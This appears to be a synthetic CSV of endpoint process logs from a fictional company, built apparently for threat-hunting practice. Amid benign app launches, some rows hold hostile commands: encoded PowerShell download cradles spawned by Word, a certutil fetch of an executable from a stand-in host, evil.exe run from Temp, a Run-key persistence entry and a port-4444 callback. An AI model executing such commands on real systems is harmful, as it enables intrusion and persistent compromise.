timestamp,host,user,process,parent_process,command_line,ip,destination_port,user_agent
2026-04-01 14:12:00,fin-ws-01,ethan,winword.exe,explorer.exe,winword.exe /background,10.0.1.15,0,none
2026-04-01 14:13:00,shared-jump-01,charlie,code.exe,explorer.exe,"code.exe ""C:\Users\charlie\Documents\project""",10.0.0.10,445,none
2026-04-01 14:14:00,fin-ws-01,helen,teams.exe,explorer.exe,teams.exe --type=renderer,151.101.1.69,443,teams-client
2026-04-01 14:15:00,shared-jump-01,julia,outlook.exe,explorer.exe,"outlook.exe /recycle ""julia@company.com""",104.18.20.12,443,outlook
2026-04-01 14:16:00,fin-ws-01,helen,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,151.101.1.69,443,edge
2026-04-01 14:17:00,hr-ws-01,ethan,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,8.8.8.8,443,zoom-client
2026-04-01 14:18:00,ops-ws-01,irfan,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,52.95.110.1,443,edge
2026-04-01 14:19:00,sales-lt-01,alice,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,104.18.20.12,443,edge
2026-04-01 14:20:00,eng-ws-02,bob,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,185.199.108.153,443,zoom-client
2026-04-01 14:21:00,ops-ws-02,helen,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,185.199.108.153,443,zoom-client
2026-04-01 14:22:00,eng-ws-01,helen,code.exe,explorer.exe,"code.exe ""C:\Users\helen\Documents\project""",10.0.2.20,445,none
2026-04-01 14:23:00,ops-ws-01,julia,teams.exe,explorer.exe,teams.exe --type=renderer,185.199.108.153,443,teams-client
2026-04-01 14:24:00,fin-ws-01,alice,teams.exe,explorer.exe,teams.exe --type=renderer,1.1.1.1,443,teams-client
2026-04-01 14:25:00,ops-ws-01,bob,slack.exe,explorer.exe,slack.exe --processStart slack.exe,23.45.67.89,443,slack-client
2026-04-01 14:26:00,eng-ws-01,diana,onenote.exe,explorer.exe,onenote.exe /background,192.168.1.12,0,none
2026-04-01 14:27:00,sales-lt-01,irfan,slack.exe,explorer.exe,slack.exe --processStart slack.exe,23.45.67.89,443,slack-client
2026-04-01 14:28:00,ops-ws-01,farah,excel.exe,explorer.exe,excel.exe /background,172.16.10.8,0,none
2026-04-01 14:29:00,ops-ws-02,farah,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\farah\Documents\notes.txt""",10.0.0.5,0,none
2026-04-01 14:30:00,ops-ws-01,bob,outlook.exe,explorer.exe,"outlook.exe /recycle ""bob@company.com""",1.1.1.1,443,outlook
2026-04-01 14:31:00,sales-lt-02,george,excel.exe,explorer.exe,excel.exe /background,10.1.5.12,0,none
2026-04-01 14:32:00,shared-jump-01,charlie,outlook.exe,explorer.exe,"outlook.exe /recycle ""charlie@company.com""",1.1.1.1,443,outlook
2026-04-01 14:33:00,shared-jump-01,charlie,outlook.exe,explorer.exe,"outlook.exe /recycle ""charlie@company.com""",52.95.110.1,443,outlook
2026-04-01 14:33:00,eng-ws-01,ethan,powershell.exe,winword.exe,powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA,8.8.8.8,443,curl/7.68
2026-04-01 14:34:00,ops-ws-02,charlie,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,1.1.1.1,443,zoom-client
2026-04-01 14:34:00,eng-ws-01,ethan,powershell.exe,winword.exe,powershell -enc aW52b2tlLXd...,1.1.1.1,443,winhttp
2026-04-01 14:35:00,hr-ws-01,irfan,explorer.exe,explorer.exe,explorer.exe /background,172.16.4.25,0,none
2026-04-01 14:35:00,eng-ws-01,ethan,powershell.exe,winword.exe,powershell -enc ZABvAHcAbgBsAG8AYQBkAC0AZQB4AGUALgAuAA==,45.33.32.156,80,python-requests
2026-04-01 14:36:00,fin-ws-01,irfan,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,142.250.183.14,443,firefox
2026-04-01 14:37:00,ops-ws-01,alice,outlook.exe,explorer.exe,"outlook.exe /recycle ""alice@company.com""",52.95.110.1,443,outlook
2026-04-01 14:38:00,fin-ws-01,diana,outlook.exe,explorer.exe,"outlook.exe /recycle ""diana@company.com""",151.101.1.69,443,outlook
2026-04-01 14:39:00,fin-ws-02,diana,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,23.45.67.89,443,chrome
2026-04-01 14:40:00,hr-ws-01,bob,slack.exe,explorer.exe,slack.exe --processStart slack.exe,185.199.108.153,443,slack-client
2026-04-01 14:41:00,sales-lt-02,alice,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\alice\Documents\notes.txt""",172.16.4.25,0,none
2026-04-01 14:42:00,shared-jump-01,charlie,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,142.250.183.14,443,zoom-client
2026-04-01 14:43:00,fin-ws-01,charlie,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,23.45.67.89,443,firefox
2026-04-01 14:44:00,sales-lt-01,alice,explorer.exe,explorer.exe,explorer.exe /background,172.16.4.25,0,none
2026-04-01 14:45:00,fin-ws-02,helen,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,52.95.110.1,443,zoom-client
2026-04-01 14:46:00,sales-lt-01,diana,slack.exe,explorer.exe,slack.exe --processStart slack.exe,45.33.32.156,443,slack-client
2026-04-01 14:47:00,hr-ws-01,helen,winword.exe,explorer.exe,winword.exe /background,172.16.4.25,0,none
2026-04-01 14:48:00,shared-jump-01,helen,teams.exe,explorer.exe,teams.exe --type=renderer,52.95.110.1,443,teams-client
2026-04-01 14:49:00,ops-ws-02,irfan,slack.exe,explorer.exe,slack.exe --processStart slack.exe,142.250.183.14,443,slack-client
2026-04-01 14:50:00,fin-ws-01,diana,code.exe,explorer.exe,"code.exe ""C:\Users\diana\Documents\project""",10.0.1.15,445,none
2026-04-01 14:51:00,hr-ws-01,alice,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\alice\Documents\notes.txt""",192.168.1.12,0,none
2026-04-01 14:52:00,ops-ws-01,irfan,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,185.199.108.153,443,chrome
2026-04-01 14:53:00,hr-ws-01,bob,code.exe,explorer.exe,"code.exe ""C:\Users\bob\Documents\project""",10.0.1.15,445,none
2026-04-01 14:54:00,hr-ws-01,helen,slack.exe,explorer.exe,slack.exe --processStart slack.exe,23.45.67.89,443,slack-client
2026-04-01 14:55:00,ops-ws-02,bob,winword.exe,explorer.exe,winword.exe /background,192.168.1.12,0,none
2026-04-01 14:56:00,ops-ws-01,alice,explorer.exe,explorer.exe,explorer.exe /background,10.0.0.5,0,none
2026-04-01 14:57:00,ops-ws-02,irfan,outlook.exe,explorer.exe,"outlook.exe /recycle ""irfan@company.com""",45.33.32.156,443,outlook
2026-04-01 14:58:00,ops-ws-02,bob,outlook.exe,explorer.exe,"outlook.exe /recycle ""bob@company.com""",45.33.32.156,443,outlook
2026-04-01 14:59:00,eng-ws-01,farah,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,104.18.20.12,443,chrome
2026-04-01 15:00:00,fin-ws-01,alice,excel.exe,explorer.exe,excel.exe /background,192.168.1.12,0,none
2026-04-01 15:01:00,fin-ws-01,helen,teams.exe,explorer.exe,teams.exe --type=renderer,8.8.8.8,443,teams-client
2026-04-01 15:02:00,eng-ws-02,alice,excel.exe,explorer.exe,excel.exe /background,10.0.2.20,0,none
2026-04-01 15:03:00,fin-ws-01,irfan,onenote.exe,explorer.exe,onenote.exe /background,192.168.10.9,0,none
2026-04-01 15:04:00,ops-ws-02,bob,code.exe,explorer.exe,"code.exe ""C:\Users\bob\Documents\project""",10.1.5.12,445,none
2026-04-01 15:05:00,fin-ws-02,ethan,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,8.8.8.8,443,chrome
2026-04-01 15:06:00,ops-ws-02,julia,teams.exe,explorer.exe,teams.exe --type=renderer,1.1.1.1,443,teams-client
2026-04-01 15:07:00,eng-ws-02,helen,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,185.199.108.153,443,zoom-client
2026-04-01 15:08:00,eng-ws-01,irfan,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,45.33.32.156,443,zoom-client
2026-04-01 15:09:00,fin-ws-01,ethan,explorer.exe,explorer.exe,explorer.exe /background,10.0.0.5,0,none
2026-04-01 15:10:00,shared-jump-01,farah,winword.exe,explorer.exe,winword.exe /background,172.16.10.8,0,none
2026-04-01 15:11:00,fin-ws-01,bob,slack.exe,explorer.exe,slack.exe --processStart slack.exe,104.18.20.12,443,slack-client
2026-04-01 15:12:00,eng-ws-02,irfan,slack.exe,explorer.exe,slack.exe --processStart slack.exe,185.199.108.153,443,slack-client
2026-04-01 15:13:00,sales-lt-02,irfan,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,142.250.183.14,443,edge
2026-04-01 15:14:00,eng-ws-01,george,outlook.exe,explorer.exe,"outlook.exe /recycle ""george@company.com""",52.95.110.1,443,outlook
2026-04-01 15:15:00,eng-ws-01,farah,code.exe,explorer.exe,"code.exe ""C:\Users\farah\Documents\project""",10.0.0.10,445,none
2026-04-01 15:16:00,ops-ws-01,diana,onenote.exe,explorer.exe,onenote.exe /background,10.0.0.10,0,none
2026-04-01 15:17:00,shared-jump-01,farah,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,8.8.8.8,443,edge
2026-04-01 15:18:00,sales-lt-02,farah,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\farah\Documents\notes.txt""",10.0.1.15,0,none
2026-04-01 15:19:00,sales-lt-01,helen,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\helen\Documents\notes.txt""",10.0.1.15,0,none
2026-04-01 15:20:00,fin-ws-01,bob,onenote.exe,explorer.exe,onenote.exe /background,192.168.1.12,0,none
2026-04-01 15:21:00,eng-ws-01,ethan,winword.exe,explorer.exe,winword.exe /background,10.0.0.5,0,none
2026-04-01 15:22:00,fin-ws-02,alice,outlook.exe,explorer.exe,"outlook.exe /recycle ""alice@company.com""",52.95.110.1,443,outlook
2026-04-01 15:23:00,sales-lt-02,george,slack.exe,explorer.exe,slack.exe --processStart slack.exe,151.101.1.69,443,slack-client
2026-04-01 15:24:00,hr-ws-01,alice,code.exe,explorer.exe,"code.exe ""C:\Users\alice\Documents\project""",10.0.2.20,445,none
2026-04-01 15:25:00,hr-ws-01,farah,code.exe,explorer.exe,"code.exe ""C:\Users\farah\Documents\project""",10.0.0.5,445,none
2026-04-01 15:26:00,ops-ws-01,ethan,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,104.18.20.12,443,edge
2026-04-01 15:27:00,ops-ws-02,helen,explorer.exe,explorer.exe,explorer.exe /background,172.16.4.25,0,none
2026-04-01 15:28:00,fin-ws-01,helen,onenote.exe,explorer.exe,onenote.exe /background,192.168.1.12,0,none
2026-04-01 15:29:00,ops-ws-01,irfan,excel.exe,explorer.exe,excel.exe /background,10.0.0.10,0,none
2026-04-01 15:30:00,ops-ws-02,bob,explorer.exe,explorer.exe,explorer.exe /background,10.0.1.15,0,none
2026-04-01 15:31:00,sales-lt-02,ethan,outlook.exe,explorer.exe,"outlook.exe /recycle ""ethan@company.com""",1.1.1.1,443,outlook
2026-04-01 15:31:00,shared-jump-01,julia,certutil.exe,cmd.exe,certutil -urlcache -split -f http://downloads.badcdn.net/update.exe file.exe,23.45.67.89,80,curl/7.68
2026-04-01 15:32:00,eng-ws-02,farah,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\farah\Documents\notes.txt""",10.1.5.12,0,none
2026-04-01 15:32:00,shared-jump-01,julia,evil.exe,explorer.exe,C:\Users\julia\AppData\Local\Temp\evil.exe,10.0.1.15,0,none
2026-04-01 15:33:00,hr-ws-01,helen,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,142.250.183.14,443,zoom-client
2026-04-01 15:33:00,shared-jump-01,julia,reg.exe,cmd.exe,reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v updater /t REG_SZ /d evil.exe,172.16.10.8,0,none
2026-04-01 15:34:00,fin-ws-01,helen,outlook.exe,explorer.exe,"outlook.exe /recycle ""helen@company.com""",151.101.1.69,443,outlook
2026-04-01 15:35:00,eng-ws-01,farah,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,142.250.183.14,443,zoom-client
2026-04-01 15:36:00,hr-ws-01,alice,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,142.250.183.14,443,edge
2026-04-01 15:37:00,sales-lt-02,charlie,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,23.45.67.89,443,firefox
2026-04-01 15:38:00,sales-lt-01,alice,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,1.1.1.1,443,chrome
2026-04-01 15:39:00,ops-ws-01,farah,explorer.exe,explorer.exe,explorer.exe /background,10.0.0.5,0,none
2026-04-01 15:40:00,shared-jump-01,charlie,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\charlie\Documents\notes.txt""",192.168.1.12,0,none
2026-04-01 15:41:00,ops-ws-01,farah,teams.exe,explorer.exe,teams.exe --type=renderer,1.1.1.1,443,teams-client
2026-04-01 15:42:00,shared-jump-01,charlie,slack.exe,explorer.exe,slack.exe --processStart slack.exe,104.18.20.12,443,slack-client
2026-04-01 15:43:00,ops-ws-02,farah,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\farah\Documents\notes.txt""",10.1.5.12,0,none
2026-04-01 15:44:00,fin-ws-02,bob,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,23.45.67.89,443,edge
2026-04-01 15:45:00,sales-lt-02,george,slack.exe,explorer.exe,slack.exe --processStart slack.exe,1.1.1.1,443,slack-client
2026-04-01 15:46:00,hr-ws-01,ethan,onenote.exe,explorer.exe,onenote.exe /background,192.168.1.12,0,none
2026-04-01 15:47:00,fin-ws-02,julia,excel.exe,explorer.exe,excel.exe /background,192.168.1.12,0,none
2026-04-01 15:48:00,fin-ws-02,bob,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,1.1.1.1,443,edge
2026-04-01 15:49:00,fin-ws-01,helen,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,104.18.20.12,443,firefox
2026-04-01 15:50:00,ops-ws-01,bob,slack.exe,explorer.exe,slack.exe --processStart slack.exe,185.199.108.153,443,slack-client
2026-04-01 15:51:00,hr-ws-01,ethan,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,23.45.67.89,443,edge
2026-04-01 15:52:00,sales-lt-02,diana,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,45.33.32.156,443,chrome
2026-04-01 15:53:00,fin-ws-02,helen,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,104.18.20.12,443,firefox
2026-04-01 15:54:00,shared-jump-01,farah,teams.exe,explorer.exe,teams.exe --type=renderer,185.199.108.153,443,teams-client
2026-04-01 15:55:00,fin-ws-01,julia,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,1.1.1.1,443,edge
2026-04-01 15:56:00,ops-ws-02,helen,slack.exe,explorer.exe,slack.exe --processStart slack.exe,142.250.183.14,443,slack-client
2026-04-01 15:57:00,ops-ws-02,julia,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,23.45.67.89,443,edge
2026-04-01 15:58:00,eng-ws-02,helen,teams.exe,explorer.exe,teams.exe --type=renderer,185.199.108.153,443,teams-client
2026-04-01 15:59:00,ops-ws-01,charlie,code.exe,explorer.exe,"code.exe ""C:\Users\charlie\Documents\project""",192.168.10.9,445,none
2026-04-01 16:00:00,shared-jump-01,charlie,code.exe,explorer.exe,"code.exe ""C:\Users\charlie\Documents\project""",10.0.1.15,445,none
2026-04-01 16:01:00,ops-ws-02,irfan,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,1.1.1.1,443,firefox
2026-04-01 16:02:00,fin-ws-01,ethan,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,23.45.67.89,443,edge
2026-04-01 16:02:00,shared-jump-01,bob,notepad.exe,explorer.exe,notepad.exe,45.33.32.156,4444,winhttp
2026-04-01 16:03:00,fin-ws-02,farah,slack.exe,explorer.exe,slack.exe --processStart slack.exe,52.95.110.1,443,slack-client
2026-04-01 16:03:00,shared-jump-01,bob,notepad.exe,explorer.exe,notepad.exe,104.18.20.12,443,python-requests
2026-04-01 16:04:00,eng-ws-02,ethan,winword.exe,explorer.exe,winword.exe /background,192.168.10.9,0,none
2026-04-01 16:05:00,hr-ws-01,charlie,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\charlie\Documents\notes.txt""",10.1.5.12,0,none
2026-04-01 16:06:00,shared-jump-01,irfan,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,185.199.108.153,443,firefox
2026-04-01 16:07:00,fin-ws-01,julia,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,23.45.67.89,443,zoom-client
2026-04-01 16:08:00,fin-ws-01,julia,onenote.exe,explorer.exe,onenote.exe /background,172.16.4.25,0,none
2026-04-01 16:09:00,shared-jump-01,alice,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,1.1.1.1,443,chrome
2026-04-01 16:10:00,shared-jump-01,ethan,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\ethan\Documents\notes.txt""",10.0.2.20,0,none
2026-04-01 16:11:00,shared-jump-01,george,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,8.8.8.8,443,zoom-client
2026-04-01 16:12:00,sales-lt-01,irfan,excel.exe,explorer.exe,excel.exe /background,10.1.5.12,0,none
2026-04-01 16:13:00,sales-lt-01,diana,code.exe,explorer.exe,"code.exe ""C:\Users\diana\Documents\project""",172.16.10.8,445,none
2026-04-01 16:14:00,hr-ws-01,helen,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,8.8.8.8,443,chrome
2026-04-01 16:15:00,sales-lt-01,george,teams.exe,explorer.exe,teams.exe --type=renderer,151.101.1.69,443,teams-client
2026-04-01 16:16:00,fin-ws-02,farah,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,23.45.67.89,443,zoom-client
2026-04-01 16:17:00,ops-ws-01,farah,onenote.exe,explorer.exe,onenote.exe /background,172.16.4.25,0,none
2026-04-01 16:18:00,ops-ws-02,charlie,code.exe,explorer.exe,"code.exe ""C:\Users\charlie\Documents\project""",172.16.4.25,445,none
2026-04-01 16:19:00,sales-lt-02,irfan,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,104.18.20.12,443,chrome
2026-04-01 16:20:00,sales-lt-01,bob,excel.exe,explorer.exe,excel.exe /background,192.168.1.12,0,none
2026-04-01 16:21:00,fin-ws-02,charlie,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,8.8.8.8,443,edge
2026-04-01 16:22:00,ops-ws-02,julia,explorer.exe,explorer.exe,explorer.exe /background,10.0.2.20,0,none
2026-04-01 16:23:00,fin-ws-01,farah,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,104.18.20.12,443,zoom-client
2026-04-01 16:24:00,fin-ws-02,charlie,teams.exe,explorer.exe,teams.exe --type=renderer,185.199.108.153,443,teams-client
2026-04-01 16:25:00,sales-lt-01,helen,excel.exe,explorer.exe,excel.exe /background,192.168.1.12,0,none
2026-04-01 16:26:00,eng-ws-01,bob,explorer.exe,explorer.exe,explorer.exe /background,192.168.10.9,0,none
2026-04-01 16:27:00,sales-lt-01,diana,winword.exe,explorer.exe,winword.exe /background,172.16.4.25,0,none
2026-04-01 16:28:00,eng-ws-01,alice,excel.exe,explorer.exe,excel.exe /background,192.168.1.12,0,none
2026-04-01 16:29:00,shared-jump-01,helen,excel.exe,explorer.exe,excel.exe /background,192.168.10.9,0,none
2026-04-01 16:30:00,eng-ws-01,bob,explorer.exe,explorer.exe,explorer.exe /background,10.0.1.15,0,none
2026-04-01 16:31:00,hr-ws-01,farah,code.exe,explorer.exe,"code.exe ""C:\Users\farah\Documents\project""",172.16.10.8,445,none
2026-04-01 16:32:00,ops-ws-01,alice,explorer.exe,explorer.exe,explorer.exe /background,10.0.0.5,0,none
2026-04-01 16:33:00,shared-jump-01,irfan,winword.exe,explorer.exe,winword.exe /background,172.16.4.25,0,none
2026-04-01 16:34:00,sales-lt-02,ethan,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,142.250.183.14,443,firefox
2026-04-01 16:35:00,sales-lt-01,irfan,excel.exe,explorer.exe,excel.exe /background,10.0.0.10,0,none
2026-04-01 16:36:00,fin-ws-01,bob,explorer.exe,explorer.exe,explorer.exe /background,172.16.4.25,0,none
2026-04-01 16:37:00,ops-ws-01,irfan,outlook.exe,explorer.exe,"outlook.exe /recycle ""irfan@company.com""",23.45.67.89,443,outlook
2026-04-01 16:38:00,fin-ws-02,julia,slack.exe,explorer.exe,slack.exe --processStart slack.exe,142.250.183.14,443,slack-client
2026-04-01 16:39:00,sales-lt-02,alice,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,8.8.8.8,443,chrome
2026-04-01 16:40:00,ops-ws-01,helen,slack.exe,explorer.exe,slack.exe --processStart slack.exe,151.101.1.69,443,slack-client
2026-04-01 16:41:00,fin-ws-01,julia,slack.exe,explorer.exe,slack.exe --processStart slack.exe,23.45.67.89,443,slack-client
2026-04-01 16:42:00,ops-ws-01,julia,outlook.exe,explorer.exe,"outlook.exe /recycle ""julia@company.com""",23.45.67.89,443,outlook
2026-04-01 16:43:00,ops-ws-02,julia,onenote.exe,explorer.exe,onenote.exe /background,10.1.5.12,0,none
2026-04-01 16:44:00,shared-jump-01,farah,slack.exe,explorer.exe,slack.exe --processStart slack.exe,185.199.108.153,443,slack-client
2026-04-01 16:45:00,sales-lt-02,helen,onenote.exe,explorer.exe,onenote.exe /background,10.1.5.12,0,none
2026-04-01 16:45:00,eng-ws-02,helen,powershell.exe,winword.exe,powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA,8.8.8.8,443,python-requests
2026-04-01 16:46:00,sales-lt-01,alice,outlook.exe,explorer.exe,"outlook.exe /recycle ""alice@company.com""",104.18.20.12,443,outlook
2026-04-01 16:46:00,eng-ws-02,helen,powershell.exe,winword.exe,powershell -enc aW52b2tlLXd...,1.1.1.1,443,winhttp
2026-04-01 16:47:00,eng-ws-02,george,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,52.95.110.1,443,zoom-client
2026-04-01 16:47:00,eng-ws-02,helen,powershell.exe,winword.exe,powershell -enc ZABvAHcAbgBsAG8AYQBkAC0AZQB4AGUALgAuAA==,45.33.32.156,80,python-requests
2026-04-01 16:48:00,eng-ws-01,julia,teams.exe,explorer.exe,teams.exe --type=renderer,52.95.110.1,443,teams-client
2026-04-01 16:49:00,shared-jump-01,julia,winword.exe,explorer.exe,winword.exe /background,10.0.0.5,0,none
2026-04-01 16:50:00,shared-jump-01,helen,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,185.199.108.153,443,firefox
2026-04-01 16:51:00,shared-jump-01,george,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,45.33.32.156,443,chrome
2026-04-01 16:52:00,shared-jump-01,bob,winword.exe,explorer.exe,winword.exe /background,10.0.0.5,0,none
2026-04-01 16:53:00,sales-lt-01,farah,explorer.exe,explorer.exe,explorer.exe /background,10.0.1.15,0,none
2026-04-01 16:54:00,ops-ws-02,diana,explorer.exe,explorer.exe,explorer.exe /background,192.168.10.9,0,none
2026-04-01 16:55:00,shared-jump-01,helen,onenote.exe,explorer.exe,onenote.exe /background,10.0.0.5,0,none
2026-04-01 16:56:00,fin-ws-01,irfan,winword.exe,explorer.exe,winword.exe /background,192.168.10.9,0,none
2026-04-01 16:57:00,ops-ws-01,helen,slack.exe,explorer.exe,slack.exe --processStart slack.exe,142.250.183.14,443,slack-client
2026-04-01 16:58:00,ops-ws-01,charlie,teams.exe,explorer.exe,teams.exe --type=renderer,185.199.108.153,443,teams-client
2026-04-01 16:59:00,ops-ws-01,irfan,outlook.exe,explorer.exe,"outlook.exe /recycle ""irfan@company.com""",52.95.110.1,443,outlook
2026-04-01 17:00:00,shared-jump-01,helen,winword.exe,explorer.exe,winword.exe /background,10.0.2.20,0,none
2026-04-01 17:01:00,hr-ws-01,irfan,excel.exe,explorer.exe,excel.exe /background,10.0.2.20,0,none
2026-04-01 17:02:00,hr-ws-01,ethan,onenote.exe,explorer.exe,onenote.exe /background,10.0.2.20,0,none
2026-04-01 17:03:00,sales-lt-01,farah,teams.exe,explorer.exe,teams.exe --type=renderer,104.18.20.12,443,teams-client
2026-04-01 17:04:00,sales-lt-02,ethan,excel.exe,explorer.exe,excel.exe /background,10.0.0.10,0,none
2026-04-01 17:05:00,shared-jump-01,irfan,explorer.exe,explorer.exe,explorer.exe /background,172.16.10.8,0,none
2026-04-01 17:06:00,ops-ws-01,charlie,excel.exe,explorer.exe,excel.exe /background,10.0.0.5,0,none
2026-04-01 17:07:00,hr-ws-01,bob,outlook.exe,explorer.exe,"outlook.exe /recycle ""bob@company.com""",151.101.1.69,443,outlook
2026-04-01 17:08:00,hr-ws-01,helen,winword.exe,explorer.exe,winword.exe /background,10.0.2.20,0,none
2026-04-01 17:09:00,sales-lt-02,ethan,slack.exe,explorer.exe,slack.exe --processStart slack.exe,52.95.110.1,443,slack-client
2026-04-01 17:10:00,fin-ws-01,bob,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,45.33.32.156,443,zoom-client
2026-04-01 17:11:00,fin-ws-02,alice,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\alice\Documents\notes.txt""",192.168.10.9,0,none
2026-04-01 17:12:00,fin-ws-02,diana,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,1.1.1.1,443,edge
2026-04-01 17:13:00,ops-ws-01,helen,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,23.45.67.89,443,chrome
2026-04-01 17:14:00,sales-lt-02,charlie,explorer.exe,explorer.exe,explorer.exe /background,192.168.1.12,0,none
2026-04-01 17:15:00,sales-lt-01,diana,code.exe,explorer.exe,"code.exe ""C:\Users\diana\Documents\project""",10.1.5.12,445,none
2026-04-01 17:16:00,ops-ws-01,ethan,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\ethan\Documents\notes.txt""",10.0.0.5,0,none
2026-04-01 17:17:00,eng-ws-02,julia,winword.exe,explorer.exe,winword.exe /background,192.168.10.9,0,none
2026-04-01 17:18:00,eng-ws-01,charlie,explorer.exe,explorer.exe,explorer.exe /background,10.0.1.15,0,none
